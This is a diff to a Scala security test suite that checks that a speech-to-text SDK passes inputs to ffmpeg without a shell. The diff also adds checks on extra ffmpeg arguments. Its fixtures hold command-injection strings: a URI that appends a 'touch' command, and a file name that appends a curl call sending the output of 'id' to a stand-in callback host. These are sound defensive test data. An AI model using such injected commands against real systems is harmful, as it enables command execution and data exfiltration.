@@ -11,11 +11,12 @@ class SpeechToTextSDKSecuritySuite extends TestBase {
     "https://example.com/audio.m3u8; touch /tmp/uri-owned"
   private val recordedFileNameWithShellMetacharacters =
     "/tmp/out.mp3; curl https://callback.example/$(id) #"
+  private val extraFfmpegArgs = Seq("-t", "2.5")
 
   test("recorded file names are passed to ffmpeg without a shell") {
     val command = SpeechSDKBase.makeFfmpegCommand(
       uriWithShellMetacharacters,
-      Seq("-t", "1"),
+      extraFfmpegArgs,
       Some(recordedFileNameWithShellMetacharacters))
 
     assert(command.head == "ffmpeg")
@@ -29,12 +30,13 @@ class SpeechToTextSDKSecuritySuite extends TestBase {
       arg == recordedFileNameWithShellMetacharacters || !arg.contains(recordedFileNameWithShellMetacharacters)))
     assert(command.contains(uriWithShellMetacharacters))
     assert(command.count(_ == uriWithShellMetacharacters) == 1)
+    assert(command.sliding(extraFfmpegArgs.length).count(_ == extraFfmpegArgs) == 2)
   }
 
   test("ffmpeg command omits recorded output when audio recording is disabled") {
     val command = SpeechSDKBase.makeFfmpegCommand(
       uriWithShellMetacharacters,
-      Seq("-t", "1"),
+      extraFfmpegArgs,
       None)
 
     assert(command.head == "ffmpeg")
@@ -43,6 +45,7 @@ class SpeechToTextSDKSecuritySuite extends TestBase {
     assert(!command.contains("|"))
     assert(!command.contains("tee"))
     assert(!command.contains(recordedFileNameWithShellMetacharacters))
+    assert(command.sliding(extraFfmpegArgs.length).count(_ == extraFfmpegArgs) == 1)
   }
 
   test("recorded file names must be non-empty") {
